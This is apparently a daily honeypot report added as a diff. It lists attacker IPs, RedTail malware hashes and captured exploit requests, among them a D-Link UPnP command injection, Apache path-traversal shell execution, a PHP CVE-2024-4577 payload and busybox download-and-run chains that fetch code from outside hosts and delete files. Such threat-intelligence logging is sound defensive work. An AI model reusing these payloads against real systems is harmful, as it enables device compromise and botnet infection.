@@ -1,0 +1,81 @@
+Top 5 IPs for 26-08-2024 :
+
+197.199.224.52
+197.134.252.37
+200.12.252.210
+222.252.21.30
+82.67.7.178
+
+
+Malware Observed:
+
+File Name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+
+File Name : redtail.arm7
+e92eaa9965b8a86c30a747608d7fc03162669968b4b9502f702556f34f478b64
+https://www.virustotal.com/gui/file/e92eaa9965b8a86c30a747608d7fc03162669968b4b9502f702556f34f478b64
+
+
+File Name : redtail.arm8
+a44fa76de8b63c049582c5737f52b6fd110c9303727223a157c51ca65f46645f
+https://www.virustotal.com/gui/file/a44fa76de8b63c049582c5737f52b6fd110c9303727223a157c51ca65f46645f
+
+
+File Name : redtail.i686
+ab208e7a71f904580068df494c6dcde60f1541ce1e999ea91d2aac8e3431285e
+https://www.virustotal.com/gui/file/ab208e7a71f904580068df494c6dcde60f1541ce1e999ea91d2aac8e3431285e
+
+
+File Name : redtail.x86_64
+44a2fbbdccad3afc19c443a4da8e144138a0ac8808d8ea8d32096dd493029d7a
+https://www.virustotal.com/gui/file/44a2fbbdccad3afc19c443a4da8e144138a0ac8808d8ea8d32096dd493029d7a
+
+Commands/exploits observed
+
+POST /soap.cgi?service=WANIPConn1 HTTP/1.1
+Host: HOSTNAME
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Hello, World
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"><NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration></NewLeaseDuration><NewInternalClient>`cd /tmp;rm -rf *;wget http://182.117.41.106:42748/Mozi.m;/tmp/Mozi.m dlink`</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort></m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>
+
+
+
+
+cd /data/local/tmp/; busybox wget http://45.202.35.36/arm4; chmod 777 arm4; ./arm4 android; busybox wget http://45.202.35.36/arm5; chmod 777 arm5; ./arm5 android; busybox wget http://45.202.35.36/arm6; chmod 777 arm6; ./arm6 android; busybox wget http://45.202.35.36/arm7; chmod 777 arm7; ./arm7 android
+
+POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
+Host: HOSTNAME
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 101
+
+X=$(curl http://91.194.55.94/sh || wget http://91.194.55.94/sh -O-); echo "$X" | sh -s apache.selfrepPOST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
+Host: HOSTNAME
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: text/plain
+Content-Length: 101
+
+X=$(curl http://91.194.55.94/sh || wget http://91.194.55.94/sh -O-); echo "$X" | sh -s apache.selfrepPOST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
+Host: HOSTNAME
+Accept: */*
+Upgrade-Insecure-Requests: 1
+User-Agent: Custom-AsyncHttpClient
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 217
+
+<?php shell_exec(base64_decode("WD0kKGN1cmwgaHR0cDovLzkxLjE5NC41NS45NC9zaCB8fCB3Z2V0IGh0dHA6Ly85MS4xOTQuNTUuOTQvc2ggLU8tKTsgZWNobyAiJFgiIHwgc2ggLXMgY3ZlXzIwMjRfNDU3Ny5zZWxmcmVw")); echo(md5("Hello CVE-2024-4577")); ?>
